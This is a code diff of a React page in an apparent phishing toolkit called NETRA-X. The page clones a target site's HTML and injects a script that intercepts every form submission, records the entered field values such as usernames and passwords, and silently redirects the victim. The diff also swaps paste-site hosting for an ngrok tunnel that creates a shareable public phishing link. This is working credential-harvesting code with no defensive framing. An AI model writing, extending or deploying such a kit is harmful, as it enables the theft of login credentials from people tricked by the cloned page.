@@ -1,7 +1,7 @@
 
 'use client';
 
-import { useState, useEffect, useRef } from 'react';
+import { useState, useEffect } from 'react';
 import type { CapturedCredential } from '@/components/credential-harvester';
 import { useToast } from '@/hooks/use-toast';
 import { CredentialHarvester } from '@/components/credential-harvester';
@@ -9,8 +9,7 @@ import { QrCodeGenerator } from '@/components/qr-code-generator';
 import { Card, CardHeader, CardTitle, CardDescription, CardContent, CardFooter } from '@/components/ui/card';
 import { Input } from '@/components/ui/input';
 import { Button } from '@/components/ui/button';
-import { Loader2, Clipboard, Globe, Wand, StopCircle } from 'lucide-react';
-import { hostOnPasteRs } from '@/actions/paste-action';
+import { Loader2, Clipboard, Globe, Wand, StopCircle, Share2 } from 'lucide-react';
 import { useAuth } from '@/hooks/use-auth';
 import { logActivity } from '@/services/activity-log-service';
 import { useForm } from 'react-hook-form';
@@ -20,6 +19,7 @@ import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from '
 import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
 import { Textarea } from '@/components/ui/textarea';
 import { clonePageFromUrl } from '@/ai/flows/clone-page-from-url-flow';
+import { getNgrokUrl } from '@/services/ngrok-service';
 
 const clonerSchema = z.object({
   redirectUrl: z.string().url({ message: 'Please enter a valid URL for redirection.' }),
@@ -29,60 +29,6 @@ const clonerSchema = z.object({
   message: 'Either a URL or HTML content is required.',
   path: ['urlToClone'],
 });
-
-const getHarvesterScript = (redirectUrl: string) => `
-<script>
-  function captureAndRedirect(form) {
-    try {
-      const formData = new FormData(form);
-      const credentials = {};
-      let capturedData = false;
-
-      for (let [key, value] of formData.entries()) {
-        if (typeof value === 'string' && value.length > 0) {
-          credentials[key] = value;
-          capturedData = true;
-        }
-      }
-
-      if (capturedData) {
-        const entry = {
-          ...credentials,
-          source: window.location.href,
-          timestamp: new Date().toISOString()
-        };
-        const storageKey = 'netra-captured-credentials';
-        try {
-          const existingData = JSON.parse(localStorage.getItem(storageKey) || '[]');
-          const updatedData = [...existingData, entry];
-          localStorage.setItem(storageKey, JSON.stringify(updatedData));
-
-          window.dispatchEvent(new StorageEvent('storage', {
-            key: storageKey,
-            newValue: JSON.stringify(updatedData)
-          }));
-        } catch(e) {
-          console.error('NETRA-X Harvester: Could not save to localStorage.', e);
-        }
-      }
-    } catch (e) {
-      console.error('NETRA-X Harvester: Error capturing form data.', e);
-    } finally {
-      setTimeout(() => {
-        window.location.href = '${redirectUrl}';
-      }, 150);
-    }
-  }
-
-  document.addEventListener('submit', function(e) {
-    if (e.target && e.target.tagName === 'FORM') {
-      e.preventDefault();
-      e.stopPropagation();
-      captureAndRedirect(e.target);
-    }
-  }, true);
-</script>
-`;
 
 export default function PhishingPage() {
   const { toast } = useToast();
@@ -104,7 +50,6 @@ export default function PhishingPage() {
     },
   });
 
-  // Load credentials from storage on initial client render
   const loadCredentialsFromStorage = () => {
     try {
         const storedCreds = localStorage.getItem(storageKey);
@@ -119,24 +64,21 @@ export default function PhishingPage() {
     loadCredentialsFromStorage();
   }, []);
   
-  // Listen for storage changes to update credentials in real-time
   useEffect(() => {
     const handleStorageChange = (event: StorageEvent) => {
-      if (event.key === storageKey) {
-        const oldCredsLength = capturedCredentials.length;
-        const newCredsRaw = event.newValue;
-        if (newCredsRaw) {
-          try {
-            const newCredsList = JSON.parse(newCredsRaw);
-            setCapturedCredentials(newCredsList);
-            if (newCredsList.length > oldCredsLength) {
-              toast({
-                variant: "destructive",
-                title: "Credentials Captured!",
-                description: "New credentials have been harvested.",
-              });
+      if (event.key === storageKey && event.newValue) {
+        try {
+            const newCredsList = JSON.parse(event.newValue);
+             if(newCredsList.length > capturedCredentials.length) {
+                 toast({
+                  variant: "destructive",
+                  title: "Credentials Captured!",
+                  description: "New credentials have been harvested.",
+                });
             }
-          } catch (e) { console.error('Failed to parse new credentials:', e); }
+            setCapturedCredentials(newCredsList);
+        } catch (e) {
+            console.error('Failed to parse credentials from storage event.', e);
         }
       }
     };
@@ -146,6 +88,7 @@ export default function PhishingPage() {
       window.removeEventListener('storage', handleStorageChange);
     };
   }, [capturedCredentials.length, toast]);
+
 
   const handleClearCredentials = () => {
     setCapturedCredentials([]);
@@ -163,6 +106,63 @@ export default function PhishingPage() {
       htmlContent: '',
     });
   };
+
+  const getHarvesterScript = (redirectUrl: string) => `
+    <script>
+      function captureAndRedirect(form) {
+        try {
+          const formData = new FormData(form);
+          const credentials = {};
+          let capturedData = false;
+
+          for (let [key, value] of formData.entries()) {
+            if (typeof value === 'string' && value.length > 0) {
+              credentials[key] = value;
+              capturedData = true;
+            }
+          }
+
+          if (capturedData) {
+            const entry = {
+              ...credentials,
+              source: window.location.href,
+              timestamp: new Date().toISOString()
+            };
+            const storageKey = 'netra-captured-credentials';
+            try {
+              const existingData = JSON.parse(localStorage.getItem(storageKey) || '[]');
+              const updatedData = [...existingData, entry];
+              localStorage.setItem(storageKey, JSON.stringify(updatedData));
+
+              // This event notifies our main app window that new credentials were captured.
+              window.dispatchEvent(new StorageEvent('storage', {
+                key: storageKey,
+                newValue: JSON.stringify(updatedData)
+              }));
+            } catch(e) {
+              console.error('NETRA-X Harvester: Could not save to localStorage.', e);
+            }
+          }
+        } catch (e) {
+          console.error('NETRA-X Harvester: Error capturing form data.', e);
+        } finally {
+          // Redirect after a short delay to ensure storage event fires.
+          setTimeout(() => {
+            window.location.href = '${redirectUrl}';
+          }, 150);
+        }
+      }
+
+      // Intercept form submissions
+      document.addEventListener('submit', function(e) {
+        if (e.target && e.target.tagName === 'FORM') {
+          e.preventDefault();
+          e.stopPropagation();
+          captureAndRedirect(e.target);
+        }
+      }, true);
+    </script>
+    `;
 
   const processAndInject = async (values: z.infer<typeof clonerSchema>) => {
     setIsProcessing(true);
@@ -192,6 +192,7 @@ export default function PhishingPage() {
       let html = originalHtml;
       const harvesterScript = getHarvesterScript(values.redirectUrl);
       
+      // Inject <base> tag to fix relative links
       if (baseHrefUrl) {
         if (html.includes('<head>')) {
           html = html.replace(/<head>/i, `<head>\\n<base href="${baseHrefUrl}">`);
@@ -200,6 +201,7 @@ export default function PhishingPage() {
         }
       }
 
+      // Inject harvester script
       if (html.includes('</body>')) {
           html = html.replace(/<\/body>/i, `${harvesterScript}</body>`);
       } else {
@@ -217,33 +219,37 @@ export default function PhishingPage() {
   };
 
 
-  const handleHostPage = async () => {
+  const handleGenerateLink = async () => {
     if (!modifiedHtml) return;
     setIsHosting(true);
     setHostedUrl(null);
-    toast({ title: "Hosting Page...", description: "Uploading content to secure host." });
+    toast({ title: "Generating Public Link...", description: "Starting ngrok tunnel. This may take a moment." });
 
     try {
-      const result = await hostOnPasteRs(modifiedHtml);
-      if (!result.success || !result.pasteId) {
-        throw new Error(result.error || "Failed to get a paste ID from the hosting service.");
+      const pageId = crypto.randomUUID();
+      const storageKey = `phishing-html-${pageId}`;
+      localStorage.setItem(storageKey, modifiedHtml);
+
+      const ngrokUrl = await getNgrokUrl();
+      if (!ngrokUrl) {
+          throw new Error("Could not get a public URL from ngrok service.");
       }
+
+      const finalUrl = `${ngrokUrl}/phish/${pageId}`;
+      setHostedUrl(finalUrl);
       
-      const url = `${window.location.origin}/api/phishing/serve/${result.pasteId}`;
-      setHostedUrl(url);
-      
-      toast({ title: "Page Hosted Successfully!", description: "Link is ready to be shared." });
+      toast({ title: "Public Link Generated!", description: "Your phishing page is accessible via ngrok." });
 
       const urlToClone = form.getValues('urlToClone');
       logActivity({
           user: user?.displayName || 'Operator',
-          action: 'Hosted Phishing Page',
+          action: 'Generated Phishing Link',
           details: `Source: ${urlToClone || 'Pasted HTML'}`
       });
 
     } catch (e) {
       const error = e instanceof Error ? e.message : "An unknown error occurred";
-      toast({ variant: 'destructive', title: "Hosting Failed", description: error });
+      toast({ variant: 'destructive', title: "Link Generation Failed", description: error });
     } finally {
       setIsHosting(false);
     }
@@ -276,7 +282,7 @@ export default function PhishingPage() {
             <Card>
                 <CardHeader>
                 <CardTitle>1. Page Cloner</CardTitle>
-                <CardDescription>Clone a page from a URL or paste HTML to inject the harvester.</CardDescription>
+                <CardDescription>Clone a page from a URL or paste HTML to inject the harvester script.</CardDescription>
                 </CardHeader>
                 <Form {...form}>
                 <form onSubmit={form.handleSubmit(processAndInject)}>
@@ -336,12 +342,12 @@ export default function PhishingPage() {
                     </Button>
                     </CardContent>
                     {modifiedHtml && (
-                    <CardFooter className="flex-col gap-4">
-                        <CardTitle className="text-xl">2. Host Page</CardTitle>
+                    <CardFooter className="flex-col items-start gap-4">
+                        <CardTitle className="text-xl">2. Generate Public Link</CardTitle>
                         <div className="w-full flex gap-2">
-                        <Button type="button" onClick={handleHostPage} disabled={isProcessing || isHosting} className="w-full">
-                           {isHosting ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <Globe className="mr-2 h-4 w-4" />}
-                           Host Page
+                        <Button type="button" onClick={handleGenerateLink} disabled={isProcessing || isHosting} className="w-full">
+                           {isHosting ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <Share2 className="mr-2 h-4 w-4" />}
+                           Generate Public Link (ngrok)
                         </Button>
                         <Button type="button" variant="secondary" onClick={handleCopyHtml}>
                             <Clipboard className="mr-2 h-4 w-4" />
